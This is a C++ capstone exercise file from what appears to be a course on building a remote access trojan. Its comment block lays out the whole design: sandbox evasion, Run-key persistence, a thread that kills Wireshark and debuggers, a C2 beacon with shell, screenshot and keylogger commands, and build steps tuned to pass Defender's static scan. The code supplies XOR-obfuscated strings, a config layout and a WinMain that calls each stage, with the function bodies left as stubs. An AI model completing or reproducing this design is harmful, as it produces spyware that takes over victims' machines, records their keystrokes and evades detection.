/*
  Exercise 07 — Full Stub (Capstone Exercise)
  -----------------------------------------------
  This is the final exercise. Build a complete RAT stub from scratch that:

  1. Anti-analysis phase:
       - Reads config (ex01)
       - Sandbox detection score check — exit if score >= 50 (Module 08 ex02)
       - 9-second startup delay with QPC verification (3 chunks of 3s)

  2. Persistence:
       - Copy self to %APPDATA%\Microsoft\<botname>.exe
       - Write Run key: HKCU\...\Run\<botname> = <target path>
       - Single-instance mutex: CreateMutexA("Global\\<botname>")
         If already running, exit.

  3. Background thread: AntiProcesses
       Checks for analyst tool names every 3 seconds.
       Kill list (minimum): wireshark.exe, procmon.exe, x64dbg.exe, x32dbg.exe

  4. C2 loop:
       a. Build beacon JSON:
            { "id": "<machine_guid>", "host": "<computername>",
              "user": "<username>", "os": "<windows_version>" }
       b. POST to https://<c2host>:<c2port>/b with auth header
       c. Parse response JSON — extract "cmd" and "args" fields
       d. Dispatch:
            "shell"       → ExecShell(args), send result to /r
            "screenshot"  → CaptureScreen(), send base64 JPEG to /r
            "keylog"      → flush key buffer to /r
            "uninstall"   → delete Run key + self, exit
            "ping"        → send "pong" to /r
       e. Sleep 5000ms + rand()%3000 - 1500 (jitter)

  NOTES:
  - Compile with: g++ -std=c++17 -O2 -mwindows -s -fno-ident
                      -static-libgcc -static-libstdc++
                      -fno-threadsafe-statics
                      ex07_full_stub.cpp
                      -lwininet -lgdiplus -ladvapi32 -lkernel32
                      -luser32 -lgdi32 -lole32
                      -Wl,--whole-archive C:/MinGW/.../libwinpthread.a
                      -Wl,--no-whole-archive
                      -o MyStub.exe
  - Entry point must be WinMain (not main) — no console window
  - Config appended by the Builder — run Builder on this binary to configure it
  - Test with Defender disabled first, then enable and verify static scan passes

  This is your final capstone. If you can build this from scratch without
  copying the existing source, you understand every part of the RAT.
*/

#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <shlobj.h>
#include <gdiplus.h>
#include <thread>
#include <mutex>
#include <atomic>
#include <string>
#include <vector>
#include <algorithm>
#include <chrono>
#include <random>

// ── Config struct ──────────────────────────────────────────────────────────────
struct Config {
    char     c2host[64];
    uint16_t c2port;
    char     authkey[32];
    char     botname[32];
    char     _pad[513];
};
static_assert(sizeof(Config) == 643, "Config size must be 643");

static const uint8_t MAGIC[8] = {0xB4,0x4B,0xD4,0x3E,0x7A,0x91,0xC3,0xF8};

// ── String obfuscation ─────────────────────────────────────────────────────────
template <size_t N>
struct ObfStr {
    char data[N];
    constexpr ObfStr(const char (&s)[N]) : data{} {
        for (size_t i = 0; i < N; i++) data[i] = s[i] ^ 0x5A;
    }
    std::string d() const {
        std::string o(data, N-1);
        for (char& c : o) c ^= 0x5A;
        return o;
    }
};

// Obfuscated constants — plaintext never in .rdata
constexpr ObfStr RUN_KEY("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
constexpr ObfStr APPDATA_PATH("Microsoft");
constexpr ObfStr CMD_SHELL("shell");
constexpr ObfStr CMD_SCREENSHOT("screenshot");
constexpr ObfStr CMD_KEYLOG("keylog");
constexpr ObfStr CMD_UNINSTALL("uninstall");
constexpr ObfStr CMD_PING("ping");

// ── Globals ────────────────────────────────────────────────────────────────────
static Config          g_cfg = {};
static std::string     g_keyBuffer;
static std::mutex      g_keyMtx;
static std::atomic<bool> g_running{true};

// ──────────────────────────────────────────────────────────────────────────────
// IMPLEMENT ALL FUNCTIONS BELOW
// Use the theory from Modules 04-08 and Exercises ex01-ex06 as reference.
// Do NOT look at the existing B4B3-RAT source until you have attempted this.
// ──────────────────────────────────────────────────────────────────────────────

// TODO: bool readConfig(Config*)
// TODO: bool isCleanEnv()
// TODO: bool isSleepSkipped()
// TODO: void startupDelay()
// TODO: void installPersistence()
// TODO: void antiProcessesThread()
// TODO: std::string execShell(const std::string&)
// TODO: std::vector<uint8_t> captureScreen()
// TODO: std::string c2Post(const std::string& path, const std::string& body)
// TODO: std::string getBotId()
// TODO: void c2Loop()

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // 1. Read config
    if (!readConfig(&g_cfg)) ExitProcess(0);

    // 2. Anti-analysis
    if (!isCleanEnv() || isSleepSkipped()) ExitProcess(0);
    startupDelay();

    // 3. Single instance
    HANDLE hMutex = CreateMutexA(nullptr, TRUE, g_cfg.botname);
    if (GetLastError() == ERROR_ALREADY_EXISTS) { CloseHandle(hMutex); ExitProcess(0); }

    // 4. Persistence
    installPersistence();

    // 5. Background thread
    std::thread t1(antiProcessesThread);
    t1.detach();

    // 6. C2 loop
    c2Loop();

    return 0;
}
